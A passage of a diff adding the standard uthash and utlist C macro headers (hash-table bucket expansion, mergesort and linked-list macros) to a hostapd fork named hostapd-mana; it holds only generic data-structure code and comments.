>         if ((HASH_KEYCMP((out)->hh.key,keyptr,keylen_in)) == 0) break;             \
>     }                                                                            \
>     if ((out)->hh.hh_next) DECLTYPE_ASSIGN(out,ELMT_FROM_HH(tbl,(out)->hh.hh_next)); \
>     else out = NULL;                                                             \
>  }                                                                               \
> } while(0)
> 
> /* add an item to a bucket  */
> #define HASH_ADD_TO_BKT(head,addhh)                                              \
> do {                                                                             \
>  head.count++;                                                                   \
>  (addhh)->hh_next = head.hh_head;                                                \
>  (addhh)->hh_prev = NULL;                                                        \
>  if (head.hh_head) { (head).hh_head->hh_prev = (addhh); }                        \
>  (head).hh_head=addhh;                                                           \
>  if (head.count >= ((head.expand_mult+1) * HASH_BKT_CAPACITY_THRESH)             \
>      && (addhh)->tbl->noexpand != 1) {                                           \
>        HASH_EXPAND_BUCKETS((addhh)->tbl);                                        \
>  }                                                                               \
> } while(0)
> 
> /* remove an item from a given bucket */
> #define HASH_DEL_IN_BKT(hh,head,hh_del)                                          \
>     (head).count--;                                                              \
>     if ((head).hh_head == hh_del) {                                              \
>       (head).hh_head = hh_del->hh_next;                                          \
>     }                                                                            \
>     if (hh_del->hh_prev) {                                                       \
>         hh_del->hh_prev->hh_next = hh_del->hh_next;                              \
>     }                                                                            \
>     if (hh_del->hh_next) {                                                       \
>         hh_del->hh_next->hh_prev = hh_del->hh_prev;                              \
>     }                                                                
> 
> /* Bucket expansion has the effect of doubling the number of buckets
>  * and redistributing the items into the new buckets. Ideally the
>  * items will distribute more or less evenly into the new buckets
>  * (the extent to which this is true is a measure of the quality of
>  * the hash function as it applies to the key domain). 
>  * 
>  * With the items distributed into more buckets, the chain length
>  * (item count) in each bucket is reduced. Thus by expanding buckets
>  * the hash keeps a bound on the chain length. This bounded chain 
>  * length is the essence of how a hash provides constant time lookup.
>  * 
>  * The calculation of tbl->ideal_chain_maxlen below deserves some
>  * explanation. First, keep in mind that we're calculating the ideal
>  * maximum chain length based on the *new* (doubled) bucket count.
>  * In fractions this is just n/b (n=number of items,b=new num buckets).
>  * Since the ideal chain length is an integer, we want to calculate 
>  * ceil(n/b). We don't depend on floating point arithmetic in this
>  * hash, so to calculate ceil(n/b) with integers we could write
>  * 
>  *      ceil(n/b) = (n/b) + ((n%b)?1:0)
>  * 
>  * and in fact a previous version of this hash did just that.
>  * But now we have improved things a bit by recognizing that b is
>  * always a power of two. We keep its base 2 log handy (call it lb),
>  * so now we can write this with a bit shift and logical AND:
>  * 
>  *      ceil(n/b) = (n>>lb) + ( (n & (b-1)) ? 1:0)
>  * 
>  */
> #define HASH_EXPAND_BUCKETS(tbl)                                                 \
> do {                                                                             \
>     unsigned _he_bkt;                                                            \
>     unsigned _he_bkt_i;                                                          \
>     struct UT_hash_handle *_he_thh, *_he_hh_nxt;                                 \
>     UT_hash_bucket *_he_new_buckets, *_he_newbkt;                                \
>     _he_new_buckets = (UT_hash_bucket*)uthash_malloc(                            \
>              2 * tbl->num_buckets * sizeof(struct UT_hash_bucket));              \
>     if (!_he_new_buckets) { uthash_fatal( "out of memory"); }                    \
>     memset(_he_new_buckets, 0,                                                   \
>             2 * tbl->num_buckets * sizeof(struct UT_hash_bucket));               \
>     tbl->ideal_chain_maxlen =                                                    \
>        (tbl->num_items >> (tbl->log2_num_buckets+1)) +                           \
>        ((tbl->num_items & ((tbl->num_buckets*2)-1)) ? 1 : 0);                    \
>     tbl->nonideal_items = 0;                                                     \
>     for(_he_bkt_i = 0; _he_bkt_i < tbl->num_buckets; _he_bkt_i++)                \
>     {                                                                            \
>         _he_thh = tbl->buckets[ _he_bkt_i ].hh_head;                             \
>         while (_he_thh) {                                                        \
>            _he_hh_nxt = _he_thh->hh_next;                                        \
>            HASH_TO_BKT( _he_thh->hashv, tbl->num_buckets*2, _he_bkt);            \
>            _he_newbkt = &(_he_new_buckets[ _he_bkt ]);                           \
>            if (++(_he_newbkt->count) > tbl->ideal_chain_maxlen) {                \
>              tbl->nonideal_items++;                                              \
>              _he_newbkt->expand_mult = _he_newbkt->count /                       \
>                                         tbl->ideal_chain_maxlen;                 \
>            }                                                                     \
>            _he_thh->hh_prev = NULL;                                              \
>            _he_thh->hh_next = _he_newbkt->hh_head;                               \
>            if (_he_newbkt->hh_head) _he_newbkt->hh_head->hh_prev =               \
>                 _he_thh;                                                         \
>            _he_newbkt->hh_head = _he_thh;                                        \
>            _he_thh = _he_hh_nxt;                                                 \
>         }                                                                        \
>     }                                                                            \
>     uthash_free( tbl->buckets, tbl->num_buckets*sizeof(struct UT_hash_bucket) ); \
>     tbl->num_buckets *= 2;                                                       \
>     tbl->log2_num_buckets++;                                                     \
>     tbl->buckets = _he_new_buckets;                                              \
>     tbl->ineff_expands = (tbl->nonideal_items > (tbl->num_items >> 1)) ?         \
>         (tbl->ineff_expands+1) : 0;                                              \
>     if (tbl->ineff_expands > 1) {                                                \
>         tbl->noexpand=1;                                                         \
>         uthash_noexpand_fyi(tbl);                                                \
>     }                                                                            \
>     uthash_expand_fyi(tbl);                                                      \
> } while(0)
> 
> 
> /* This is an adaptation of Simon Tatham's O(n log(n)) mergesort */
> /* Note that HASH_SORT assumes the hash handle name to be hh. 
>  * HASH_SRT was added to allow the hash handle name to be passed in. */
> #define HASH_SORT(head,cmpfcn) HASH_SRT(hh,head,cmpfcn)
> #define HASH_SRT(hh,head,cmpfcn)                                                 \
> do {                                                                             \
>   unsigned _hs_i;                                                                \
>   unsigned _hs_looping,_hs_nmerges,_hs_insize,_hs_psize,_hs_qsize;               \
>   struct UT_hash_handle *_hs_p, *_hs_q, *_hs_e, *_hs_list, *_hs_tail;            \
>   if (head) {                                                                    \
>       _hs_insize = 1;                                                            \
>       _hs_looping = 1;                                                           \
>       _hs_list = &((head)->hh);                                                  \
>       while (_hs_looping) {                                                      \
>           _hs_p = _hs_list;                                                      \
>           _hs_list = NULL;                                                       \
>           _hs_tail = NULL;                                                       \
>           _hs_nmerges = 0;                                                       \
>           while (_hs_p) {                                                        \
>               _hs_nmerges++;                                                     \
>               _hs_q = _hs_p;                                                     \
>               _hs_psize = 0;                                                     \
>               for ( _hs_i = 0; _hs_i  < _hs_insize; _hs_i++ ) {                  \
>                   _hs_psize++;                                                   \
>                   _hs_q = (UT_hash_handle*)((_hs_q->next) ?                      \
>                           ((void*)((char*)(_hs_q->next) +                        \
>                           (head)->hh.tbl->hho)) : NULL);                         \
>                   if (! (_hs_q) ) break;                                         \
>               }                                                                  \
>               _hs_qsize = _hs_insize;                                            \
>               while ((_hs_psize > 0) || ((_hs_qsize > 0) && _hs_q )) {           \
>                   if (_hs_psize == 0) {                                          \
>                       _hs_e = _hs_q;                                             \
>                       _hs_q = (UT_hash_handle*)((_hs_q->next) ?                  \
>                               ((void*)((char*)(_hs_q->next) +                    \
>                               (head)->hh.tbl->hho)) : NULL);                     \
>                       _hs_qsize--;                                               \
>                   } else if ( (_hs_qsize == 0) || !(_hs_q) ) {                   \
>                       _hs_e = _hs_p;                                             \
>                       if (_hs_p){                                                \
>                         _hs_p = (UT_hash_handle*)((_hs_p->next) ?                \
>                                 ((void*)((char*)(_hs_p->next) +                  \
>                                 (head)->hh.tbl->hho)) : NULL);                   \
>                        }                                                         \
>                       _hs_psize--;                                               \
>                   } else if ((                                                   \
>                       cmpfcn(DECLTYPE(head)(ELMT_FROM_HH((head)->hh.tbl,_hs_p)), \
>                              DECLTYPE(head)(ELMT_FROM_HH((head)->hh.tbl,_hs_q))) \
>                              ) <= 0) {                                           \
>                       _hs_e = _hs_p;                                             \
>                       if (_hs_p){                                                \
>                         _hs_p = (UT_hash_handle*)((_hs_p->next) ?                \
>                                ((void*)((char*)(_hs_p->next) +                   \
>                                (head)->hh.tbl->hho)) : NULL);                    \
>                        }                                                         \
>                       _hs_psize--;                                               \
>                   } else {                                                       \
>                       _hs_e = _hs_q;                                             \
>                       _hs_q = (UT_hash_handle*)((_hs_q->next) ?                  \
>                               ((void*)((char*)(_hs_q->next) +                    \
>                               (head)->hh.tbl->hho)) : NULL);                     \
>                       _hs_qsize--;                                               \
>                   }                                                              \
>                   if ( _hs_tail ) {                                              \
>                       _hs_tail->next = ((_hs_e) ?                                \
>                             ELMT_FROM_HH((head)->hh.tbl,_hs_e) : NULL);          \
>                   } else {                                                       \
>                       _hs_list = _hs_e;                                          \
>                   }                                                              \
>                   if (_hs_e) {                                                   \
>                   _hs_e->prev = ((_hs_tail) ?                                    \
>                      ELMT_FROM_HH((head)->hh.tbl,_hs_tail) : NULL);              \
>                   }                                                              \
>                   _hs_tail = _hs_e;                                              \
>               }                                                                  \
>               _hs_p = _hs_q;                                                     \
>           }                                                                      \
>           if (_hs_tail){                                                         \
>             _hs_tail->next = NULL;                                               \
>           }                                                                      \
>           if ( _hs_nmerges <= 1 ) {                                              \
>               _hs_looping=0;                                                     \
>               (head)->hh.tbl->tail = _hs_tail;                                   \
>               DECLTYPE_ASSIGN(head,ELMT_FROM_HH((head)->hh.tbl, _hs_list));      \
>           }                                                                      \
>           _hs_insize *= 2;                                                       \
>       }                                                                          \
>       HASH_FSCK(hh,head);                                                        \
>  }                                                                               \
> } while (0)
> 
> /* This function selects items from one hash into another hash. 
>  * The end result is that the selected items have dual presence 
>  * in both hashes. There is no copy of the items made; rather 
>  * they are added into the new hash through a secondary hash 
>  * hash handle that must be present in the structure. */
> #define HASH_SELECT(hh_dst, dst, hh_src, src, cond)                              \
> do {                                                                             \
>   unsigned _src_bkt, _dst_bkt;                                                   \
>   void *_last_elt=NULL, *_elt;                                                   \
>   UT_hash_handle *_src_hh, *_dst_hh, *_last_elt_hh=NULL;                         \
>   ptrdiff_t _dst_hho = ((char*)(&(dst)->hh_dst) - (char*)(dst));                 \
>   if (src) {                                                                     \
>     for(_src_bkt=0; _src_bkt < (src)->hh_src.tbl->num_buckets; _src_bkt++) {     \
>       for(_src_hh = (src)->hh_src.tbl->buckets[_src_bkt].hh_head;                \
>           _src_hh;                                                               \
>           _src_hh = _src_hh->hh_next) {                                          \
>           _elt = ELMT_FROM_HH((src)->hh_src.tbl, _src_hh);                       \
>           if (cond(_elt)) {                                                      \
>             _dst_hh = (UT_hash_handle*)(((char*)_elt) + _dst_hho);               \
>             _dst_hh->key = _src_hh->key;                                         \
>             _dst_hh->keylen = _src_hh->keylen;                                   \
>             _dst_hh->hashv = _src_hh->hashv;                                     \
>             _dst_hh->prev = _last_elt;                                           \
>             _dst_hh->next = NULL;                                                \
>             if (_last_elt_hh) { _last_elt_hh->next = _elt; }                     \
>             if (!dst) {                                                          \
>               DECLTYPE_ASSIGN(dst,_elt);                                         \
>               HASH_MAKE_TABLE(hh_dst,dst);                                       \
>             } else {                                                             \
>               _dst_hh->tbl = (dst)->hh_dst.tbl;                                  \
>             }                                                                    \
>             HASH_TO_BKT(_dst_hh->hashv, _dst_hh->tbl->num_buckets, _dst_bkt);    \
>             HASH_ADD_TO_BKT(_dst_hh->tbl->buckets[_dst_bkt],_dst_hh);            \
>             (dst)->hh_dst.tbl->num_items++;                                      \
>             _last_elt = _elt;                                                    \
>             _last_elt_hh = _dst_hh;                                              \
>           }                                                                      \
>       }                                                                          \
>     }                                                                            \
>   }                                                                              \
>   HASH_FSCK(hh_dst,dst);                                                         \
> } while (0)
> 
> #define HASH_CLEAR(hh,head)                                                      \
> do {                                                                             \
>   if (head) {                                                                    \
>     uthash_free((head)->hh.tbl->buckets,                                         \
>                 (head)->hh.tbl->num_buckets*sizeof(struct UT_hash_bucket));      \
>     HASH_BLOOM_FREE((head)->hh.tbl);                                             \
>     uthash_free((head)->hh.tbl, sizeof(UT_hash_table));                          \
>     (head)=NULL;                                                                 \
>   }                                                                              \
> } while(0)
> 
> #define HASH_OVERHEAD(hh,head)                                                   \
>  (size_t)((((head)->hh.tbl->num_items   * sizeof(UT_hash_handle))   +            \
>            ((head)->hh.tbl->num_buckets * sizeof(UT_hash_bucket))   +            \
>             (sizeof(UT_hash_table))                                 +            \
>             (HASH_BLOOM_BYTELEN)))
> 
> #ifdef NO_DECLTYPE
> #define HASH_ITER(hh,head,el,tmp)                                                \
> for((el)=(head), (*(char**)(&(tmp)))=(char*)((head)?(head)->hh.next:NULL);       \
>   el; (el)=(tmp),(*(char**)(&(tmp)))=(char*)((tmp)?(tmp)->hh.next:NULL)) 
> #else
> #define HASH_ITER(hh,head,el,tmp)                                                \
> for((el)=(head),(tmp)=DECLTYPE(el)((head)?(head)->hh.next:NULL);                 \
>   el; (el)=(tmp),(tmp)=DECLTYPE(el)((tmp)?(tmp)->hh.next:NULL))
> #endif
> 
> /* obtain a count of items in the hash */
> #define HASH_COUNT(head) HASH_CNT(hh,head) 
> #define HASH_CNT(hh,head) ((head)?((head)->hh.tbl->num_items):0)
> 
> typedef struct UT_hash_bucket {
>    struct UT_hash_handle *hh_head;
>    unsigned count;
> 
>    /* expand_mult is normally set to 0. In this situation, the max chain length
>     * threshold is enforced at its default value, HASH_BKT_CAPACITY_THRESH. (If
>     * the bucket's chain exceeds this length, bucket expansion is triggered). 
>     * However, setting expand_mult to a non-zero value delays bucket expansion
>     * (that would be triggered by additions to this particular bucket)
>     * until its chain length reaches a *multiple* of HASH_BKT_CAPACITY_THRESH.
>     * (The multiplier is simply expand_mult+1). The whole idea of this
>     * multiplier is to reduce bucket expansions, since they are expensive, in
>     * situations where we know that a particular bucket tends to be overused.
>     * It is better to let its chain length grow to a longer yet-still-bounded
>     * value, than to do an O(n) bucket expansion too often. 
>     */
>    unsigned expand_mult;
> 
> } UT_hash_bucket;
> 
> /* random signature used only to find hash tables in external analysis */
> #define HASH_SIGNATURE 0xa0111fe1
> #define HASH_BLOOM_SIGNATURE 0xb12220f2
> 
> typedef struct UT_hash_table {
>    UT_hash_bucket *buckets;
>    unsigned num_buckets, log2_num_buckets;
>    unsigned num_items;
>    struct UT_hash_handle *tail; /* tail hh in app order, for fast append    */
>    ptrdiff_t hho; /* hash handle offset (byte pos of hash handle in element */
> 
>    /* in an ideal situation (all buckets used equally), no bucket would have
>     * more than ceil(#items/#buckets) items. that's the ideal chain length. */
>    unsigned ideal_chain_maxlen;
> 
>    /* nonideal_items is the number of items in the hash whose chain position
>     * exceeds the ideal chain maxlen. these items pay the penalty for an uneven
>     * hash distribution; reaching them in a chain traversal takes >ideal steps */
>    unsigned nonideal_items;
> 
>    /* ineffective expands occur when a bucket doubling was performed, but 
>     * afterward, more than half the items in the hash had nonideal chain
>     * positions. If this happens on two consecutive expansions we inhibit any
>     * further expansion, as it's not helping; this happens when the hash
>     * function isn't a good fit for the key domain. When expansion is inhibited
>     * the hash will still work, albeit no longer in constant time. */
>    unsigned ineff_expands, noexpand;
> 
>    uint32_t signature; /* used only to find hash tables in external analysis */
> #ifdef HASH_BLOOM
>    uint32_t bloom_sig; /* used only to test bloom exists in external analysis */
>    uint8_t *bloom_bv;
>    char bloom_nbits;
> #endif
> 
> } UT_hash_table;
> 
> typedef struct UT_hash_handle {
>    struct UT_hash_table *tbl;
>    void *prev;                       /* prev element in app order      */
>    void *next;                       /* next element in app order      */
>    struct UT_hash_handle *hh_prev;   /* previous hh in bucket order    */
>    struct UT_hash_handle *hh_next;   /* next hh in bucket order        */
>    void *key;                        /* ptr to enclosing struct's key  */
>    unsigned keylen;                  /* enclosing struct's key len     */
>    unsigned hashv;                   /* result of hash-fcn(key)        */
> } UT_hash_handle;
> 
> #endif /* UTHASH_H */
diff '--color=auto' -rN hostapd-2.6/src/ap/uthash/utlist.h hostapd-mana/src/ap/uthash/utlist.h
0a1,757
> /*
> Copyright (c) 2007-2014, Troy D. Hanson   http://troydhanson.github.com/uthash/
> All rights reserved.
> 
> Redistribution and use in source and binary forms, with or without
> modification, are permitted provided that the following conditions are met:
> 
>     * Redistributions of source code must retain the above copyright
>       notice, this list of conditions and the following disclaimer.
> 
> THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
> IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
> TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
> PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
> OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
> EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
> PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
> LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
> NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
> SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
> */
> 
> #ifndef UTLIST_H
> #define UTLIST_H
> 
> #define UTLIST_VERSION 1.9.9
> 
> #include <assert.h>
> 
> /* 
>  * This file contains macros to manipulate singly and doubly-linked lists.
>  *
>  * 1. LL_ macros:  singly-linked lists.
>  * 2. DL_ macros:  doubly-linked lists.
>  * 3. CDL_ macros: circular doubly-linked lists.
>  *
>  * To use singly-linked lists, your structure must have a "next" pointer.
>  * To use doubly-linked lists, your structure must "prev" and "next" pointers.
>  * Either way, the pointer to the head of the list must be initialized to NULL.
>  * 
>  * ----------------.EXAMPLE -------------------------
>  * struct item {
>  *      int id;
>  *      struct item *prev, *next;
>  * }
>  *
>  * struct item *list = NULL:
>  *
>  * int main() {
>  *      struct item *item;
>  *      ... allocate and populate item ...
>  *      DL_APPEND(list, item);
>  * }
>  * --------------------------------------------------
>  *
>  * For doubly-linked lists, the append and delete macros are O(1)
>  * For singly-linked lists, append and delete are O(n) but prepend is O(1)
>  * The sort macro is O(n log(n)) for all types of single/double/circular lists.
>  */
> 
> /* These macros use decltype or the earlier __typeof GNU extension.
>    As decltype is only available in newer compilers (VS2010 or gcc 4.3+
>    when compiling c++ code), this code uses whatever method is needed
>    or, for VS2008 where neither is available, uses casting workarounds. */
> #ifdef _MSC_VER            /* MS compiler */
> #if _MSC_VER >= 1600 && defined(__cplusplus)  /* VS2010 or newer in C++ mode */
> #define LDECLTYPE(x) decltype(x)
> #else                     /* VS2008 or older (or VS2010 in C mode) */
> #define NO_DECLTYPE
> #define LDECLTYPE(x) char*
> #endif
> #elif defined(__ICCARM__)
> #define NO_DECLTYPE
> #define LDECLTYPE(x) char*
> #else                      /* GNU, Sun and other compilers */
> #define LDECLTYPE(x) __typeof(x)
> #endif
> 
> /* for VS2008 we use some workarounds to get around the lack of decltype,
>  * namely, we always reassign our tmp variable to the list head if we need
>  * to dereference its prev/next pointers, and save/restore the real head.*/
> #ifdef NO_DECLTYPE
> #define _SV(elt,list) _tmp = (char*)(list); {char **_alias = (char**)&(list); *_alias = (elt); }
> #define _NEXT(elt,list,next) ((char*)((list)->next))
> #define _NEXTASGN(elt,list,to,next) { char **_alias = (char**)&((list)->next); *_alias=(char*)(to); }
> /* #define _PREV(elt,list,prev) ((char*)((list)->prev)) */
> #define _PREVASGN(elt,list,to,prev) { char **_alias = (char**)&((list)->prev); *_alias=(char*)(to); }
> #define _RS(list) { char **_alias = (char**)&(list); *_alias=_tmp; }
> #define _CASTASGN(a,b) { char **_alias = (char**)&(a); *_alias=(char*)(b); }
> #else 
> #define _SV(elt,list)
> #define _NEXT(elt,list,next) ((elt)->next)
> #define _NEXTASGN(elt,list,to,next) ((elt)->next)=(to)
> /* #define _PREV(elt,list,prev) ((elt)->prev) */
> #define _PREVASGN(elt,list,to,prev) ((elt)->prev)=(to)
> #define _RS(list)
> #define _CASTASGN(a,b) (a)=(b)
> #endif
> 
> /******************************************************************************
>  * The sort macro is an adaptation of Simon Tatham's O(n log(n)) mergesort    *
>  * Unwieldy variable names used here to avoid shadowing passed-in variables.  *
>  *****************************************************************************/
> #define LL_SORT(list, cmp)                                                                     \
>     LL_SORT2(list, cmp, next)
> 
> #define LL_SORT2(list, cmp, next)                                                              \
> do {                                                                                           \
>   LDECLTYPE(list) _ls_p;                                                                       \
>   LDECLTYPE(list) _ls_q;                                                                       \
>   LDECLTYPE(list) _ls_e;                                                                       \
>   LDECLTYPE(list) _ls_tail;                                                                    \
>   int _ls_insize, _ls_nmerges, _ls_psize, _ls_qsize, _ls_i, _ls_looping;                       \
>   if (list) {                                                                                  \
>     _ls_insize = 1;                                                                            \
>     _ls_looping = 1;                                                                           \
>     while (_ls_looping) {                                                                      \
>       _CASTASGN(_ls_p,list);                                                                   \
>       list = NULL;                                                                             \
>       _ls_tail = NULL;                                                                         \
>       _ls_nmerges = 0;                                                                         \
>       while (_ls_p) {                                                                          \
>         _ls_nmerges++;                                                                         \
>         _ls_q = _ls_p;                                                                         \
>         _ls_psize = 0;                                                                         \
>         for (_ls_i = 0; _ls_i < _ls_insize; _ls_i++) {                                         \
>           _ls_psize++;                                                                         \
>           _SV(_ls_q,list); _ls_q = _NEXT(_ls_q,list,next); _RS(list);                          \
>           if (!_ls_q) break;                                                                   \
>         }                                                                                      \
>         _ls_qsize = _ls_insize;                                                                \
>         while (_ls_psize > 0 || (_ls_qsize > 0 && _ls_q)) {                                    \
>           if (_ls_psize == 0) {                                                                \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>           } else if (_ls_qsize == 0 || !_ls_q) {                                               \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>           } else if (cmp(_ls_p,_ls_q) <= 0) {                                                  \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>           } else {                                                                             \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>           }                                                                                    \
>           if (_ls_tail) {                                                                      \
>             _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,_ls_e,next); _RS(list);                \
>           } else {                                                                             \
>             _CASTASGN(list,_ls_e);                                                             \
>           }                                                                                    \
>           _ls_tail = _ls_e;                                                                    \
>         }                                                                                      \
>         _ls_p = _ls_q;                                                                         \
>       }                                                                                        \
>       if (_ls_tail) {                                                                          \
>         _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,NULL,next); _RS(list);                     \
>       }                                                                                        \
>       if (_ls_nmerges <= 1) {                                                                  \
>         _ls_looping=0;                                                                         \
>       }                                                                                        \
>       _ls_insize *= 2;                                                                         \
>     }                                                                                          \
>   }                                                                                            \
> } while (0)
> 
> 
> #define DL_SORT(list, cmp)                                                                     \
>     DL_SORT2(list, cmp, prev, next)
> 
> #define DL_SORT2(list, cmp, prev, next)                                                        \
> do {                                                                                           \
>   LDECLTYPE(list) _ls_p;                                                                       \
>   LDECLTYPE(list) _ls_q;                                                                       \
>   LDECLTYPE(list) _ls_e;                                                                       \
>   LDECLTYPE(list) _ls_tail;                                                                    \
>   int _ls_insize, _ls_nmerges, _ls_psize, _ls_qsize, _ls_i, _ls_looping;                       \
>   if (list) {                                                                                  \
>     _ls_insize = 1;                                                                            \
>     _ls_looping = 1;                                                                           \
>     while (_ls_looping) {                                                                      \
>       _CASTASGN(_ls_p,list);                                                                   \
>       list = NULL;                                                                             \
>       _ls_tail = NULL;                                                                         \
>       _ls_nmerges = 0;                                                                         \
>       while (_ls_p) {                                                                          \
>         _ls_nmerges++;                                                                         \
>         _ls_q = _ls_p;                                                                         \
>         _ls_psize = 0;                                                                         \
>         for (_ls_i = 0; _ls_i < _ls_insize; _ls_i++) {                                         \
>           _ls_psize++;                                                                         \
>           _SV(_ls_q,list); _ls_q = _NEXT(_ls_q,list,next); _RS(list);                          \
>           if (!_ls_q) break;                                                                   \
>         }                                                                                      \
>         _ls_qsize = _ls_insize;                                                                \
>         while (_ls_psize > 0 || (_ls_qsize > 0 && _ls_q)) {                                    \
>           if (_ls_psize == 0) {                                                                \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>           } else if (_ls_qsize == 0 || !_ls_q) {                                               \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>           } else if (cmp(_ls_p,_ls_q) <= 0) {                                                  \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>           } else {                                                                             \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>           }                                                                                    \
>           if (_ls_tail) {                                                                      \
>             _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,_ls_e,next); _RS(list);                \
>           } else {                                                                             \
>             _CASTASGN(list,_ls_e);                                                             \
>           }                                                                                    \
>           _SV(_ls_e,list); _PREVASGN(_ls_e,list,_ls_tail,prev); _RS(list);                     \
>           _ls_tail = _ls_e;                                                                    \
>         }                                                                                      \
>         _ls_p = _ls_q;                                                                         \
>       }                                                                                        \
>       _CASTASGN(list->prev, _ls_tail);                                                         \
>       _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,NULL,next); _RS(list);                       \
>       if (_ls_nmerges <= 1) {                                                                  \
>         _ls_looping=0;                                                                         \
>       }                                                                                        \
>       _ls_insize *= 2;                                                                         \
>     }                                                                                          \
>   }                                                                                            \
> } while (0)
> 
> #define CDL_SORT(list, cmp)                                                                    \
>     CDL_SORT2(list, cmp, prev, next)
> 
> #define CDL_SORT2(list, cmp, prev, next)                                                       \
> do {                                                                                           \
>   LDECLTYPE(list) _ls_p;                                                                       \
>   LDECLTYPE(list) _ls_q;                                                                       \
>   LDECLTYPE(list) _ls_e;                                                                       \
>   LDECLTYPE(list) _ls_tail;                                                                    \
>   LDECLTYPE(list) _ls_oldhead;                                                                 \
>   LDECLTYPE(list) _tmp;                                                                        \
>   int _ls_insize, _ls_nmerges, _ls_psize, _ls_qsize, _ls_i, _ls_looping;                       \
>   if (list) {                                                                                  \
>     _ls_insize = 1;                                                                            \
>     _ls_looping = 1;                                                                           \
>     while (_ls_looping) {                                                                      \
>       _CASTASGN(_ls_p,list);                                                                   \
>       _CASTASGN(_ls_oldhead,list);                                                             \
>       list = NULL;                                                                             \
>       _ls_tail = NULL;                                                                         \
>       _ls_nmerges = 0;                                                                         \
>       while (_ls_p) {                                                                          \
>         _ls_nmerges++;                                                                         \
>         _ls_q = _ls_p;                                                                         \
>         _ls_psize = 0;                                                                         \
>         for (_ls_i = 0; _ls_i < _ls_insize; _ls_i++) {                                         \
>           _ls_psize++;                                                                         \
>           _SV(_ls_q,list);                                                                     \
>           if (_NEXT(_ls_q,list,next) == _ls_oldhead) {                                         \
>             _ls_q = NULL;                                                                      \
>           } else {                                                                             \
>             _ls_q = _NEXT(_ls_q,list,next);                                                    \
>           }                                                                                    \
>           _RS(list);                                                                           \
>           if (!_ls_q) break;                                                                   \
>         }                                                                                      \
>         _ls_qsize = _ls_insize;                                                                \
>         while (_ls_psize > 0 || (_ls_qsize > 0 && _ls_q)) {                                    \
>           if (_ls_psize == 0) {                                                                \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>             if (_ls_q == _ls_oldhead) { _ls_q = NULL; }                                        \
>           } else if (_ls_qsize == 0 || !_ls_q) {                                               \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>             if (_ls_p == _ls_oldhead) { _ls_p = NULL; }                                        \
>           } else if (cmp(_ls_p,_ls_q) <= 0) {                                                  \
>             _ls_e = _ls_p; _SV(_ls_p,list); _ls_p =                                            \
>               _NEXT(_ls_p,list,next); _RS(list); _ls_psize--;                                  \
>             if (_ls_p == _ls_oldhead) { _ls_p = NULL; }                                        \
>           } else {                                                                             \
>             _ls_e = _ls_q; _SV(_ls_q,list); _ls_q =                                            \
>               _NEXT(_ls_q,list,next); _RS(list); _ls_qsize--;                                  \
>             if (_ls_q == _ls_oldhead) { _ls_q = NULL; }                                        \
>           }                                                                                    \
>           if (_ls_tail) {                                                                      \
>             _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,_ls_e,next); _RS(list);                \
>           } else {                                                                             \
>             _CASTASGN(list,_ls_e);                                                             \
>           }                                                                                    \
>           _SV(_ls_e,list); _PREVASGN(_ls_e,list,_ls_tail,prev); _RS(list);                     \
>           _ls_tail = _ls_e;                                                                    \
>         }                                                                                      \
>         _ls_p = _ls_q;                                                                         \
>       }                                                                                        \
>       _CASTASGN(list->prev,_ls_tail);                                                          \
>       _CASTASGN(_tmp,list);                                                                    \
>       _SV(_ls_tail,list); _NEXTASGN(_ls_tail,list,_tmp,next); _RS(list);                       \
>       if (_ls_nmerges <= 1) {                                                                  \
>         _ls_looping=0;                                                                         \
>       }                                                                                        \
>       _ls_insize *= 2;                                                                         \
>     }                                                                                          \
>   }                                                                                            \
> } while (0)
> 
> /******************************************************************************
>  * singly linked list macros (non-circular)                                   *
>  *****************************************************************************/
> #define LL_PREPEND(head,add)                                                                   \
>     LL_PREPEND2(head,add,next)
> 
> #define LL_PREPEND2(head,add,next)                                                             \
> do {                                                                                           \
>   (add)->next = head;                                                                          \
>   head = add;                                                                                  \
> } while (0)
> 
